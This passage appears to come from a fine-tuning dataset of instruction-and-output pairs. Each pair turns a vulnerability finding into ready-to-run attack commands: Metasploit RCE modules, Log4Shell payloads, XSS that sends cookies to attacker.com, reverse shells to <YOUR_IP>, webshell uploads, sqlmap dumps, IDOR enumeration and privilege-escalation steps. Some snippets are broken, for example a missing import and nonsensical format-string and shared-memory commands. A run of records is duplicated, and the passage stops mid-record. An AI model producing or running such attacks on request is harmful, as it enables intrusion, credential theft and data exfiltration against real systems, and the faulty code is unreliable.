    "input": "Scan on target 192.168.100.10: TeamViewer 15.2 vulnerable to CVE-2019-18988, allowing unauth RCE via crafted packets.",
    "output": "Step 1️⃣ — Identify Vulnerability\nTeamViewer flaw in packet handling enables remote code execution over the control channel.\n\nStep 2️⃣ — Formulate Exploit\nUse the auxiliary module to send malicious packets for shell.\n\nStep 3️⃣ — Execute Attack\n```bash\nmsfconsole -q -x \"use exploit/windows/misc/teamviewer_rce; set RHOSTS 192.168.100.10; set RPORT 5938; set LHOST <YOUR_IP>; set PAYLOAD windows/x64/meterpreter/reverse_tcp; exploit\"\n```"
  },
  {
    "instruction": "Provide the commands to exploit the improper error handling for info disclosure.",
    "input": "Finding: App at https://app.com/search throws stack traces on invalid input, revealing paths, versions, and DB queries.",
    "output": "Step 1️⃣ — Identify Vulnerability\nVerbose errors leak internal details for targeted attacks.\n\nStep 2️⃣ — Trigger and Parse\nSend invalid payload to elicit trace, grep for secrets.\n\nStep 3️⃣ — Execute Attack\n```bash\ncurl 'https://app.com/search?q=\\' -v 2>&1 | grep -E 'path|version|sql' | head -10\n```"
  },
  {
    "instruction": "Generate the Python script to exploit the weak JWT signature for token forgery.",
    "input": "JWT decode: Token uses RS256 but public key is weak (e.g., low exponent), allowing signature forgery with private key generation.",
    "output": "Step 1️⃣ — Identify Vulnerability\nWeak RSA key in JWT allows crafting valid signatures with small private keys.\n\nStep 2️⃣ — Forge Signature\nUse script to generate weak private key and sign new payload.\n\nStep 3️⃣ — Execute Attack\n```python\nfrom cryptography.hazmat.primitives.asymmetric import rsa, padding\nfrom cryptography.hazmat.primitives import serialization, hashes\npriv = rsa.generate_private_key(public_exponent=3, key_size=1024)\npub = priv.public_key()\nheader = b'{\"alg\":\"RS256\",\"typ\":\"JWT\"}'\npayload = b'{\"user\":\"admin\"}'\nmsg = base64.urlsafe_b64encode(header) + b'.' + base64.urlsafe_b64encode(payload)\nsig = priv.sign(msg, padding.PSS(mgf=padding.MGF1(hashes.SHA256()), salt_length=padding.PSS.MAX_LENGTH), hashes.SHA256())\ntoken = msg + b'.' + base64.urlsafe_b64encode(sig)\nprint(token.decode())\n# Use in curl -H 'Authorization: Bearer <TOKEN>' https://app.com/admin\n```"
  },
  {
    "instruction": "Provide the curl command to exploit the HTTP method override for CSRF bypass.",
    "input": "Finding: Form at https://site.com/update uses POST but allows _method=PUT override, no CSRF token on PUT.",
    "output": "Step 1️⃣ — Identify Vulnerability\nMethod override enables bypassing CSRF protections on non-POST methods.\n\nStep 2️⃣ — Override Method\nSet _method=DELETE in POST to trigger destructive action.\n\nStep 3️⃣ — Execute Attack\n```bash\ncurl -X POST https://site.com/update -d '_method=DELETE&user_id=123' -b 'session=<VICTIM_COOKIE>'\n```"
  },
  {
    "instruction": "Generate the command sequence to exploit the insecure cookie flags for session theft.",
    "input": "Finding: Session cookie at http://site.com lacks HttpOnly and Secure, transmitted over HTTP and accessible via JS.",
    "output": "Step 1️⃣ — Identify Vulnerability\nInsecure flags allow interception or JS theft of session cookies.\n\nStep 2️⃣ — Steal via XSS or MITM\nInject JS to exfil or sniff network traffic.\n\nStep 3️⃣ — Execute Attack\nMITM: `tcpdump -i eth0 -A port 80 | grep -i cookie`\nXSS payload: `<script>fetch('http://attacker.com?cookie='+document.cookie)</script>`"
  },
  {
    "instruction": "Provide the steps and command to exploit the vulnerable log4j in log forwarding for RCE.",
    "input": "Finding: App logs user input to Log4j 2.10.0, forwarded to internal ELK at udp/10514, vulnerable to Log4Shell.",
    "output": "Step 1️⃣ — Identify Vulnerability\nLog4j JNDI lookup in logs triggers RCE on log server.\n\nStep 2️⃣ — Craft JNDI Payload\nInject ${jndi:ldap://attacker.com/a} in input that gets logged.\n\nStep 3️⃣ — Execute Attack\nHost LDAP: `java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://attacker.com/#Shell <YOUR_IP> 1389`\nInject: `curl 'https://app.com/input?data=${jndi:ldap://<YOUR_IP>:1389/a}'`"
  },
  {
    "instruction": "Generate a two-step chain using path traversal to include remote config for RCE.",
    "input": "Finding 1: Traversal in /include.php?file=local.txt. Finding 2: allow_url_include=On in php.ini, allowing http:// wrappers.",
    "output": "Step 1️⃣ — Host Malicious Config\nServe a PHP shell via HTTP.\n\nStep 2️⃣ — Include Remote File\nTraverse to include the remote URL as code.\n\nStep 3️⃣ — Execute Attack\nHost shell.php on attacker.com, then:\n```bash\ncurl 'http://target.com/include.php?file=http://attacker.com/shell.php'\n```"
  },
  {
    "instruction": "Assuming shell, provide commands to exploit the cron job with user-controlled PATH for priv esc.",
    "input": "Enum: Cron job runs /usr/bin/logger as root every 5 min, PATH includes user-writable /tmp.",
    "output": "Step 1️⃣ — Identify Privilege Escalation\nUser-controlled PATH allows hijacking cron commands.\n\nStep 2️⃣ — Hijack Binary\nCreate fake logger in /tmp that runs shell.\n\nStep 3️⃣ — Execute Attack\n```bash\necho 'export PATH=/tmp:$PATH' >> /tmp/cronenv\ncp /bin/sh /tmp/logger\necho '#!/bin/sh' > /tmp/logger\n# Wait for cron, get root shell\n```"
  },
  {
    "instruction": "Generate the command to exploit the insecure deserialization in Ruby Marshal for RCE.",
    "input": "Finding: Rails app at https://railsapp.com/session uses Marshal.load on user session data, vulnerable to gadget chains.",
    "output": "Step 1️⃣ — Identify Vulnerability\nRuby Marshal deserialization allows injecting code-executing objects without validation.\n\nStep 2️⃣ — Craft Payload\nUse a Marshal gadget for system call, e.g., via Gem::Specification.\n\nStep 3️⃣ — Execute Attack\nListener: `nc -lvnp 7777`. Generate and send:\n```bash\nruby -e 'payload=Gem::Specification.new;payload.instance_variable_set(\"@rubygems_api_key\", \"bash -i >& /dev/tcp/<YOUR_IP>/7777 0>&1\");Marshal.dump(payload)' > payload.marshal\ncurl -X POST --data-binary @payload.marshal -H 'Content-Type: application/octet-stream' https://railsapp.com/session\n```"
  },
  {
    "instruction": "Provide the curl command to exploit the open redirect in OAuth callback for token theft.",
    "input": "Finding: OAuth callback at https://auth.com/callback?redirect_uri=app.com allows arbitrary redirect_uri without validation.",
    "output": "Step 1️⃣ — Identify Vulnerability\nOpen redirect in callback exposes auth codes/tokens in URL to attacker site.\n\nStep 2️⃣ — Craft Redirect\nSet redirect_uri to attacker.com to capture the fragment/hash with token.\n\nStep 3️⃣ — Execute Attack\nPhish with auth URL:\n```bash\ncurl 'https://auth.com/authorize?client_id=app&redirect_uri=https://attacker.com/capture&response_type=code&scope=admin'\n# At attacker.com, log #access_token= for use\n```"
  },
  {
    "instruction": "Generate the Metasploit command to exploit the WordPress plugin RCE vulnerability.",
    "input": "Scan on https://blog.com: WordPress 5.8 with 'download-manager' plugin 3.2.4 vulnerable to CVE-2021-24284, unauth file upload to RCE.",
    "output": "Step 1️⃣ — Identify Vulnerability\nPlugin flaw allows unauth PHP shell upload via AJAX endpoint.\n\nStep 2️⃣ — Configure Module\nUse the WordPress module to upload and execute shell.\n\nStep 3️⃣ — Execute Attack\n```bash\nmsfconsole -q -x \"use exploit/unix/webapp/wp_downloadmanager_rce; set RHOSTS blog.com; set RPORT 80; set LHOST <YOUR_IP>; set PAYLOAD php/meterpreter/reverse_tcp; exploit\"\n```"
  },
  {
    "instruction": "Provide the commands to exploit the broken object level authorization for data access.",
    "input": "API finding: /api/orders/123 accessible with user token, but changing to /api/orders/456 accesses other user's orders.",
    "output": "Step 1️⃣ — Identify Vulnerability\nBOLA allows manipulating object IDs to access unauthorized resources.\n\nStep 2️⃣ — Enumerate Objects\nIterate over IDs to dump sensitive data.\n\nStep 3️⃣ — Execute Attack\n```bash\nfor id in {1..1000}; do curl -H 'Authorization: Bearer <USER_TOKEN>' https://api.com/orders/$id | jq '.items'; done\n```"
  },
  {
    "instruction": "Generate the sqlmap command to exploit the time-based blind SQL injection for user dump.",
    "input": "Finding: Time-based blind SQLi in 'post_id' at http://blog.com/view?id=1, MySQL backend.",
    "output": "Step 1️⃣ — Identify Vulnerability\nBlind SQLi infers data via response delays, useful for extraction without errors.\n\nStep 2️⃣ — Formulate sqlmap\nUse --technique=B for boolean/time, --dump for users.\n\nStep 3️⃣ — Execute Attack\n```bash\nsqlmap -u \"http://blog.com/view?id=1\" -p id --dbms=mysql --technique=B --delay=2 --dump -D blog -T users\n```"
  },
  {
    "instruction": "Provide the Python script to exploit the insecure random number generation in OTP for bypass.",
    "input": "Finding: OTP generated with insecure random (0-9999), predictable if seeded by time, validated on /login-otp.",
    "output": "Step 1️⃣ — Identify Vulnerability\nLow-entropy random allows brute-forcing or predicting OTPs.\n\nStep 2️⃣ — Predict/Brute\nScript to guess current time-based OTP and submit.\n\nStep 3️⃣ — Execute Attack\n```python\nimport requests, time\nseed = int(time.time() // 60)  # Minute seed\nfor otp in range(1000):\n    r = requests.post('https://app.com/login-otp', data={'otp': otp, 'session': '<SESSION>'})\n    if 'success' in r.text:\n        print(f'Valid OTP: {otp}')\n        break\n```"
  },
  {
    "instruction": "Generate the command to exploit the exposed stack traces for path disclosure.",
    "input": "Error page at https://app.com/error?id=1 reveals full stack with paths like /var/www/app/controllers/UserController.php:45.",
    "output": "Step 1️⃣ — Identify Vulnerability\nStack traces leak filesystem paths for LFI or traversal attacks.\n\nStep 2️⃣ — Trigger and Extract\nForce error to get trace, grep paths.\n\nStep 3️⃣ — Execute Attack\n```bash\ncurl 'https://app.com/error?id=\\' 2>&1 | grep -o '/var/www/[a-zA-Z0-9./]*'\n# Use in LFI: curl 'https://app.com/include?file=/var/www/app/config/database.php'\n```"
  },
  {
    "instruction": "Provide the curl commands to exploit the mass assignment for account hijacking.",
    "input": "Finding: User update at https://users.com/update accepts JSON with 'role' field, binding all params without whitelist.",
    "output": "Step 1️⃣ — Identify Vulnerability\nMass assignment overwrites privileged fields like role=admin.\n\nStep 2️⃣ — Craft Payload\nInclude unauthorized fields in update JSON.\n\nStep 3️⃣ — Execute Attack\n```bash\ncurl -X PATCH https://users.com/update/123 -H 'Content-Type: application/json' -d '{\"role\":\"admin\",\"email\":\"attacker@evil.com\"}' -b 'auth=<TOKEN>'\n```"
  },
  {
    "instruction": "Generate a two-step attack chain using stored XSS to admin session hijack.",
    "input": "Finding 1: Stored XSS in /comments via <script>alert(1)</script>. Finding 2: Admin views comments without sanitization, stealing cookies.",
    "output": "Step 1️⃣ — Store Payload\nPost comment with XSS to steal cookie on view.\n\nStep 2️⃣ — Hijack Admin\nWhen admin views, payload sends their cookie to attacker.\n\nStep 3️⃣ — Execute Attack\nPost:\n```bash\ncurl -X POST https://site.com/comments -d 'text=<script>fetch(\"http://attacker.com/steal?cookie=\"+document.cookie)</script>'\n```\nUse stolen admin cookie: `curl -b 'session=<ADMIN_COOKIE>' https://site.com/admin`"
  },
  {
    "instruction": "Assuming initial access, provide commands to exploit the symbolic link following in backup script for priv esc.",
    "input": "Enum: Backup cron runs as root, follows symlinks in /home/user/backups/, allowing overwrite of root files.",
    "output": "Step 1️⃣ — Identify Privilege Escalation\nSymlink following allows writing to root-owned files via user-controlled path.\n\nStep 2️⃣ — Create Symlink\nLink to sensitive file like /etc/shadow.\n\nStep 3️⃣ — Execute Attack\n```bash\nln -s /etc/passwd /home/user/backups/new_passwd\n# Trigger backup or wait cron, it overwrites\necho 'root::0:0:root:/root:/bin/sh' > /home/user/backups/new_passwd\n```"
  },
  {
    "instruction": "Generate the command to exploit the insecure file upload with double extension bypass.",
    "input": "Finding: Upload form at https://fileupload.com/upload allows .jpg but appends .php, check fails on first extension, enabling shell.php.jpg.",
    "output": "Step 1️⃣ — Identify Vulnerability\nExtension validation on first dot allows double-ext bypass for webshell upload.\n\nStep 2️⃣ — Craft Malicious File\nCreate shell.php.jpg with PHP code, upload as image.\n\nStep 3️⃣ — Execute Attack\n```bash\necho '<?php system($_GET[\"cmd\"]); ?>' > shell.php.jpg\ncurl -F 'file=@shell.php.jpg' https://fileupload.com/upload\ncurl 'https://fileupload.com/uploads/shell.php.jpg?cmd=id'\n```"
  },
  {
    "instruction": "Provide the curl command to exploit the reflected GET parameter XSS for phishing.",
    "input": "Finding: Reflected XSS in /redirect?msg=hello at http://site.com/redirect?msg=<script>alert(1)</script>, outputs unsanitized.",
    "output": "Step 1️⃣ — Identify Vulnerability\nReflected XSS in URL param allows injecting JS for phishing or theft.\n\nStep 2️⃣ — Craft Phishing Link\nEmbed payload to redirect and steal creds.\n\nStep 3️⃣ — Execute Attack\n```bash\ncurl 'http://site.com/redirect?msg=<script>window.location=\"https://fake.com/login?token=\"+document.cookie</script>' -v\n```"
  },
  {
    "instruction": "Generate the Metasploit command to exploit the Joomla component RCE.",
    "input": "Scan on https://cms.com: Joomla 3.7.0 with com_fields vulnerable to CVE-2017-8917, unauth RCE via parameter injection.",
    "output": "Step 1️⃣ — Identify Vulnerability\nJoomla com_fields allows arbitrary file write leading to PHP execution.\n\nStep 2️⃣ — Configure Module\nUse the Joomla module for shell upload.\n\nStep 3️⃣ — Execute Attack\n```bash\nmsfconsole -q -x \"use exploit/multi/http/joomla_com_fields_rce; set RHOSTS cms.com; set RPORT 80; set LHOST <YOUR_IP>; set PAYLOAD php/meterpreter/reverse_tcp; exploit\"\n```"
  },
  {
    "instruction": "Provide the commands to exploit the weak access control on the admin API for user creation.",
    "input": "Finding: /api/admin/users POST at https://api.com/api/admin/users lacks auth, allows creating users with admin role.",
    "output": "Step 1️⃣ — Identify Vulnerability\nUnauth admin API exposes user management for account takeover.\n\nStep 2️⃣ — Create Backdoor User\nPOST JSON with admin privileges.\n\nStep 3️⃣ — Execute Attack\n```bash\ncurl -X POST https://api.com/api/admin/users -H 'Content-Type: application/json' -d '{\"username\":\"attacker\",\"role\":\"admin\",\"password\":\"pass123\"}'\n# Login: curl -X POST https://api.com/login -d 'user=attacker&pass=pass123'\n```"
  },
  {
    "instruction": "Generate the sqlmap command to escalate union SQL injection to file read.",
    "input": "Finding: Union SQLi in 'id' at http://db.com/user?id=1, MySQL with LOAD_FILE privilege.",
    "output": "Step 1️⃣ — Identify Vulnerability\nUnion SQLi allows subqueries like LOAD_FILE for local file read.\n\nStep 2️⃣ — Formulate sqlmap\nUse --file-read to dump files via union.\n\nStep 3️⃣ — Execute Attack\n```bash\nsqlmap -u \"http://db.com/user?id=1\" -p id --dbms=mysql --technique=U --file-read /etc/passwd -o output.txt\n```"
  },
  {
    "instruction": "Provide the Python script to exploit the predictable CSRF token generation for form submission.",
    "input": "Finding: CSRF token at https://site.com/form is MD5 of timestamp, predictable if time known.",
    "output": "Step 1️⃣ — Identify Vulnerability\nPredictable tokens allow forging valid CSRF for protected actions.\n\nStep 2️⃣ — Generate Token\nCompute MD5 of current time for submission.\n\nStep 3️⃣ — Execute Attack\n```python\nimport requests, hashlib, time\nts = str(int(time.time()))\ntoken = hashlib.md5(ts.encode()).hexdigest()\nr = requests.post('https://site.com/form', data={'csrf_token': token, 'action': 'delete'})\nprint(r.text)\n```"
  },
  {
    "instruction": "Generate the command to exploit the exposed debug console for code evaluation.",
    "input": "Finding: /debug/console at http://app.com/debug/console allows eval() on POST 'code' param, no auth.",
    "output": "Step 1️⃣ — Identify Vulnerability\nExposed eval console permits arbitrary code execution.\n\nStep 2️⃣ — Inject Code\nPOST PHP or JS for reverse shell.\n\nStep 3️⃣ — Execute Attack\nListener: `nc -lvnp 4444`.\n```bash\ncurl -X POST http://app.com/debug/console -d 'code=system(\"nc -e /bin/sh <YOUR_IP> 4444\");'\n```"
  },
  {
    "instruction": "Provide the curl commands to exploit the parameter pollution for auth bypass.",
    "input": "Finding: Login at https://auth.com/login parses first 'user' param, ignores duplicates; set user=admin&user=guest to bypass.",
    "output": "Step 1️⃣ — Identify Vulnerability\nHTTP param pollution confuses parsers, using first value for auth.\n\nStep 2️⃣ — Pollute Params\nDuplicate param with admin value first.\n\nStep 3️⃣ — Execute Attack\n```bash\ncurl https://auth.com/login -d 'user=admin&user=guest&pass=wrong' -c cookies.txt\ncurl https://auth.com/dashboard -b cookies.txt\n```"
  },
  {
    "instruction": "Generate a two-step chain using command injection to log poisoning for LFI RCE.",
    "input": "Finding 1: Cmd injection in /ping?ip=127.0.0.1;touch /tmp/pwned. Finding 2: LFI in /view?file=/var/log/access.log.",
    "output": "Step 1️⃣ — Inject into Log\nUse injection to write PHP shell to access log via User-Agent.\n\nStep 2️⃣ — Include Log\nView the log via LFI to execute shell.\n\nStep 3️⃣ — Execute Attack\nInject:\n```bash\ncurl -A '<?php system($_GET[\"x\"]); ?>' 'http://target.com/ping?ip=127.0.0.1;id'\n```\nExecute:\n```bash\ncurl 'http://target.com/view?file=../../../var/log/apache2/access.log?x=whoami'\n```"
  },
  {
    "instruction": "Assuming shell, provide commands to exploit the setuid binary with format string vuln for priv esc.",
    "input": "Enum: /usr/local/bin/print SUID root, vulnerable to %s format string leak of stack for GOT overwrite.",
    "output": "Step 1️⃣ — Identify Privilege Escalation\nFormat string in SUID allows leaking addresses for ROP or GOT overwrite to shell.\n\nStep 2️⃣ — Leak and Overwrite\nUse %x to dump stack, find GOT, overwrite with system addr.\n\nStep 3️⃣ — Execute Attack\n```bash\n# Leak: ./print '%08x.%08x.%08x.%08x.%08x'\n# Overwrite example: ./print '%n' -d $(python3 -c 'print(\"%lx.\"*20)')  # Adjust for GOT\n./print '%08x'*20 | ./print 'AAAA%08x%08x%08x%hn'  # Simplified\n```"
  },
  {
    "instruction": "Generate the command to exploit the insecure deserialization in .NET MessagePack for RCE.",
    "input": "Finding: .NET app at https://dotnet.com/api uses MessagePackSerializer without type safety, vulnerable to gadget chains via ysoserial.net.",
    "output": "Step 1️⃣ — Identify Vulnerability\nUnsafe MessagePack deserialization allows injecting executable objects leading to RCE.\n\nStep 2️⃣ — Generate Payload\nUse ysoserial.net to create a payload for reverse shell.\n\nStep 3️⃣ — Execute Attack\nListener: `nc -lvnp 5555`.\n```bash\nysoserial.exe -f MessagePack -g TypeConfuseDelegate -c 'bash -c \"bash -i >& /dev/tcp/<YOUR_IP>/5555 0>&1\"' > payload.msgpack\ncurl -X POST --data-binary @payload.msgpack -H 'Content-Type: application/octet-stream' https://dotnet.com/api\n```"
  },
  {
    "instruction": "Provide the curl command to exploit the open redirect in email verification link.",
    "input": "Finding: Verification at https://app.com/verify?token=abc&redirect=profile allows redirect=http://evil.com, no validation.",
    "output": "Step 1️⃣ — Identify Vulnerability\nOpen redirect in verification flow allows stealing tokens via malicious links.\n\nStep 2️⃣ — Craft Malicious Link\nAppend redirect to capture token in URL.\n\nStep 3️⃣ — Execute Attack\nPhish with: `https://app.com/verify?token=<STOLEN_TOKEN>&redirect=http://attacker.com/capture`\nCapture at attacker.com and use token."
  },
  {
    "instruction": "Generate the Metasploit command to exploit the Magento SQL injection for admin access.",
    "input": "Scan on https://shop.com: Magento 2.3.5 vulnerable to CVE-2020-9694, unauth SQLi in rest/V1/integration/admin/token.",
    "output": "Step 1️⃣ — Identify Vulnerability\nSQLi in Magento token endpoint allows extracting admin hashes for login.\n\nStep 2️⃣ — Configure Module\nUse the auxiliary module to inject and dump users.\n\nStep 3️⃣ — Execute Attack\n```bash\nmsfconsole -q -x \"use auxiliary/gather/magento_sqli_admin_token; set RHOSTS shop.com; set RPORT 443; set SSL true; run\"\n```"
  },
  {
    "instruction": "Provide the commands to exploit the insecure shared memory for process injection.",
    "input": "Post-access enum: App uses shared memory segment with world-write perms, allowing injection into running processes.",
    "output": "Step 1️⃣ — Identify Vulnerability\nWritable shared memory allows overwriting process data for code injection.\n\nStep 2️⃣ — Inject Payload\nAttach to segment and overwrite function pointers.\n\nStep 3️⃣ — Execute Attack\n```bash\n# Find segment: ipcs -m\n# Attach: shmattach <SHMID>\n# In shell: dd if=shellcode.bin of=/dev/shm/<SEG> bs=1 seek=<OFFSET>\n# Trigger via app interaction\n```"
  },
  {
    "instruction": "Generate the sqlmap command to exploit the error-based SQL injection for hash dump.",
    "input": "Finding: Error-based SQLi in 'login' param at https://auth.com/check, SQL Server backend.",
    "output": "Step 1️⃣ — Identify Vulnerability\nError-based SQLi leaks DB errors, revealing structure and data like hashes.\n\nStep 2️⃣ — Formulate sqlmap\nUse --technique=E for errors, --dump for hashes.\n\nStep 3️⃣ — Execute Attack\n```bash\nsqlmap -u \"https://auth.com/check\" --data=\"user=admin&login=1\" -p login --dbms=mssql --technique=E --dump -D master -T sys.sql_logins\n```"
  },
  {
    "instruction": "Provide the Python script to exploit the weak PBKDF2 iteration count for offline cracking.",
    "input": "Dump: Passwords with PBKDF2-HMAC-SHA1, iterations=1000, salt per user, but low count allows GPU cracking.",
    "output": "Step 1️⃣ — Identify Vulnerability\nLow iterations make PBKDF2 crackable offline with modern hardware.\n\nStep 2️⃣ — Crack with John\nUse john with PBKDF2 format.\n\nStep 3️⃣ — Execute Attack\nSave as pbkdf2.hash, run:\n```bash\njohn --format=PBKDF2-HMAC-SHA1 pbkdf2.hash --wordlist=rockyou.txt\n# Or Python: from passlib.hash import pbkdf2_sha1; pbkdf2_sha1.verify('test', '<HASH>')\n```"
  },
  {
    "instruction": "Generate the command to exploit the SSRF in webhook configuration for internal pivot.",
    "input": "Finding: Webhook setup at https://webhooks.com/add?url=http://webhooks.com allows http://10.0.0.1:8080/internal.",
    "output": "Step 1️⃣ — Identify Vulnerability\nSSRF in webhook URL allows pinging internal services.\n\nStep 2️⃣ — Pivot Internally\nSet webhook to internal API for data exfil.\n\nStep 3️⃣ — Execute Attack\n```bash\ncurl -X POST https://webhooks.com/add -d 'url=http://10.0.0.1:8080/admin/dump' -d 'trigger=true'\n```"
  },
  {
    "instruction": "Provide the curl command to exploit the format string vulnerability in logging for leak.",
    "input": "Finding: Log endpoint at https://log.com/record?msg=%s leaks stack via printf-style formatting.",
    "output": "Step 1️⃣ — Identify Vulnerability\nFormat string in log allows reading stack memory.\n\nStep 2️⃣ — Leak Data\nUse %x placeholders to dump addresses.\n\nStep 3️⃣ — Execute Attack\n```bash\ncurl 'https://log.com/record?msg=%08x.%08x.%08x.%08x'\n# Parse for pointers, leak strings with %s\n```"
  },
  {
    "instruction": "Generate a two-step chain using DOM Clobbering to override global objects for XSS.",
    "input": "Finding 1: Page loads <iframe name=\"window\">. Finding 2: JS checks window.location for navigation without sanitization.",
    "output": "Step 1️⃣ — Clobber window\nInject iframe to redefine window object properties.\n\nStep 2️⃣ — Trigger XSS\nOverride location to execute script.\n\nStep 3️⃣ — Execute Attack\nInject HTML:\n```html\n<iframe name=\"window\" srcdoc=\"<form action='javascript:alert(document.cookie)'><input name='location' value='data:text/html,<script>evil()</script>'></form><script>window.location = document.forms[0].location.value</script>\"></iframe>\n```"
  },
  {
    "instruction": "Assuming shell, provide commands to exploit the kernel module loading with CAP_SYS_MODULE for root.",
    "input": "Enum: Process runs with CAP_SYS_MODULE, allows loading arbitrary kernel modules.",
    "output": "Step 1️⃣ — Identify Privilege Escalation\nCAP_SYS_MODULE permits insmod for rootkit loading.\n\nStep 2️⃣ — Load Malicious Module\nCompile and insert custom module for backdoor.\n\nStep 3️⃣ — Execute Attack\n```bash\n# Compile: gcc -o rootkit.ko rootkit.c -c -nostdinc -I/usr/src/linux-headers/include\ninsmod rootkit.ko\n# Module spawns root shell\n```"
  },
  {
    "instruction": "Generate the command to exploit the insecure deserialization in .NET MessagePack for RCE.",
    "input": "Finding: .NET app at https://dotnet.com/api uses MessagePackSerializer without type safety, vulnerable to gadget chains via ysoserial.net.",
    "output": "Step 1️⃣ — Identify Vulnerability\nUnsafe MessagePack deserialization allows injecting executable objects leading to RCE.\n\nStep 2️⃣ — Generate Payload\nUse ysoserial.net to create a payload for reverse shell.\n\nStep 3️⃣ — Execute Attack\nListener: `nc -lvnp 5555`.\n```bash\nysoserial.exe -f MessagePack -g TypeConfuseDelegate -c 'bash -c \"bash -i >& /dev/tcp/<YOUR_IP>/5555 0>&1\"' > payload.msgpack\ncurl -X POST --data-binary @payload.msgpack -H 'Content-Type: application/octet-stream' https://dotnet.com/api\n```"
  },
  {
    "instruction": "Provide the curl command to exploit the open redirect in email verification link.",
    "input": "Finding: Verification at https://app.com/verify?token=abc&redirect=profile allows redirect=http://evil.com, no validation.",
    "output": "Step 1️⃣ — Identify Vulnerability\nOpen redirect in verification flow allows stealing tokens via malicious links.\n\nStep 2️⃣ — Craft Malicious Link\nAppend redirect to capture token in URL.\n\nStep 3️⃣ — Execute Attack\nPhish with: `https://app.com/verify?token=<STOLEN_TOKEN>&redirect=http://attacker.com/capture`\nCapture at attacker.com and use token."
  },
  {
    "instruction": "Generate the Metasploit command to exploit the Magento SQL injection for admin access.",
    "input": "Scan on https://shop.com: Magento 2.3.5 vulnerable to CVE-2020-9694, unauth SQLi in rest/V1/integration/admin/token.",
    "output": "Step 1️⃣ — Identify Vulnerability\nSQLi in Magento token endpoint allows extracting admin hashes for login.\n\nStep 2️⃣ — Configure Module\nUse the auxiliary module to inject and dump users.\n\nStep 3️⃣ — Execute Attack\n```bash\nmsfconsole -q -x \"use auxiliary/gather/magento_sqli_admin_token; set RHOSTS shop.com; set RPORT 443; set SSL true; run\"\n```"
  },
  {
    "instruction": "Provide the commands to exploit the insecure shared memory for process injection.",
    "input": "Post-access enum: App uses shared memory segment with world-write perms, allowing injection into running processes.",
    "output": "Step 1️⃣ — Identify Vulnerability\nWritable shared memory allows overwriting process data for code injection.\n\nStep 2️⃣ — Inject Payload\nAttach to segment and overwrite function pointers.\n\nStep 3️⃣ — Execute Attack\n```bash\n# Find segment: ipcs -m\n# Attach: shmattach <SHMID>\n# In shell: dd if=shellcode.bin of=/dev/shm/<SEG> bs=1 seek=<OFFSET>\n# Trigger via app interaction\n```"
  },
  {
    "instruction": "Generate the sqlmap command to exploit the error-based SQL injection for hash dump.",
    "input": "Finding: Error-based SQLi in 'login' param at https://auth.com/check, SQL Server backend.",
    "output": "Step 1️⃣ — Identify Vulnerability\nError-based SQLi leaks DB errors, revealing structure and data like hashes.\n\nStep 2️⃣ — Formulate sqlmap\nUse --technique=E for errors, --dump for hashes.\n\nStep 3️⃣ — Execute Attack\n```bash\nsqlmap -u \"https://auth.com/check\" --data=\"user=admin&login=1\" -p login --dbms=mssql --technique=E --dump -D master -T sys.sql_logins\n```"
  },
  {
    "instruction": "Provide the Python script to exploit the weak PBKDF2 iteration count for offline cracking.",
    "input": "Dump: Passwords with PBKDF2-HMAC-SHA1, iterations=1000, salt per user, but low count allows GPU cracking.",
    "output": "Step 1️⃣ — Identify Vulnerability\nLow iterations make PBKDF2 crackable offline with modern hardware.\n\nStep 2️⃣ — Crack with John\nUse john with PBKDF2 format.\n\nStep 3️⃣ — Execute Attack\nSave as pbkdf2.hash, run:\n```bash\njohn --format=PBKDF2-HMAC-SHA1 pbkdf2.hash --wordlist=rockyou.txt\n# Or Python: from passlib.hash import pbkdf2_sha1; pbkdf2_sha1.verify('test', '<HASH>')\n```"
  },
  {
    "instruction": "Generate the command to exploit the SSRF in webhook configuration for internal pivot.",
    "input": "Finding: Webhook setup at https://webhooks.com/add?url=http://webhooks.com allows http://10.0.0.1:8080/internal.",
    "output": "Step 1️⃣ — Identify Vulnerability\nSSRF in webhook URL allows pinging internal services.\n\nStep 2️⃣ — Pivot Internally\nSet webhook to internal API for data exfil.\n\nStep 3️⃣ — Execute Attack\n```bash\ncurl -X POST https://webhooks.com/add -d 'url=http://10.0.0.1:8080/admin/dump' -d 'trigger=true'\n```"
  },
  {
    "instruction": "Provide the curl command to exploit the format string vulnerability in logging for leak.",
    "input": "Finding: Log endpoint at https://log.com/record?msg=%s leaks stack via printf-style formatting.",
    "output": "Step 1️⃣ — Identify Vulnerability\nFormat string in log allows reading stack memory.\n\nStep 2️⃣ — Leak Data\nUse %x placeholders to dump addresses.\n\nStep 3️⃣ — Execute Attack\n```bash\ncurl 'https://log.com/record?msg=%08x.%08x.%08x.%08x'\n# Parse for pointers, leak strings with %s\n```"
  },
  {
    "instruction": "Generate a two-step chain using DOM Clobbering to override global objects for XSS.",
    "input": "Finding 1: Page loads <iframe name=\"window\">. Finding 2: JS checks window.location for navigation without sanitization.",
    "output": "Step 1️⃣ — Clobber window\nInject iframe to redefine window object properties.\n\nStep 2️⃣ — Trigger XSS\nOverride location to execute script.\n\nStep 3️⃣ — Execute Attack\nInject HTML:\n```html\n<iframe name=\"window\" srcdoc=\"<form action='javascript:alert(document.cookie)'><input name='location' value='data:text/html,<script>evil()</script>'></form><script>window.location = document.forms[0].location.value</script>\"></iframe>\n```"
  },
  {
    "instruction": "Assuming shell, provide commands to exploit the kernel module loading with CAP_SYS_MODULE for root.",
    "input": "Enum: Process runs with CAP_SYS_MODULE, allows loading arbitrary kernel modules.",
    "output": "Step 1️⃣ — Identify Privilege Escalation\nCAP_SYS_MODULE permits insmod for rootkit loading.\n\nStep 2️⃣ — Load Malicious Module\nCompile and insert custom module for backdoor.\n\nStep 3️⃣ — Execute Attack\n```bash\n# Compile: gcc -o rootkit.ko rootkit.c -c -nostdinc -I/usr/src/linux-headers/include\ninsmod rootkit.ko\n# Module spawns root shell\n```"
  },
  {
    "instruction": "Generate the command to exploit the insecure direct object reference in invoice download.",
    "input": "Finding: Invoice API at https://billing.com/api/invoice/456 downloads PDF for any ID, no ownership check on user token.",
    "output": "Step 1️⃣ — Identify Vulnerability\nIDOR allows accessing other users' invoices by changing the ID parameter.\n\nStep 2️⃣ — Enumerate Invoices\nIterate through sequential IDs to download sensitive financial data.\n\nStep 3️⃣ — Execute Attack\n```bash\nfor id in {100..500}; do curl -H 'Authorization: Bearer <USER_TOKEN>' \"https://billing.com/api/invoice/$id\" -o invoice_$id.pdf --fail --silent || continue; echo \"Downloaded: $id\"; done\n```"
  },
  {
    "instruction": "Provide the curl command to exploit the stored XSS in user profile bio for admin alert.",
    "input": "Finding: Bio field in /profile at https://social.com/profile stores <script>alert('XSS')</script> and renders in admin dashboard without escape.",
